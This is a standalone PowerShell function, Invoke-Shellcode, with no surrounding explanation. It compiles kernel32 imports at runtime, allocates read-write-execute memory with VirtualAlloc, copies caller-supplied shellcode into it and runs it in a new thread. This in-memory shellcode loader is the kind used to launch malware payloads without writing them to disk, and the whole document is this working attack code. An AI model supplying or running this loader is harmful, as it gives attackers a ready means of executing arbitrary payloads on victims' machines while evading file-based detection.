function Invoke-Shellcode {
    param (
        [Parameter(Mandatory=$true)]
        [Byte[]] $Shellcode,

        [Switch] $Force
    )

    $UnsafeNativeMethods = @"
using System;
using System.Runtime.InteropServices;

public class UnsafeNativeMethods {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

    Add-Type $UnsafeNativeMethods

    $size = $Shellcode.Length
    $addr = [UnsafeNativeMethods]::VirtualAlloc(0, $size, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $addr, $size)
    $th = [UnsafeNativeMethods]::CreateThread(0, 0, $addr, 0, 0, 0)
    [UnsafeNativeMethods]::WaitForSingleObject($th, 0xFFFFFFFF)
}
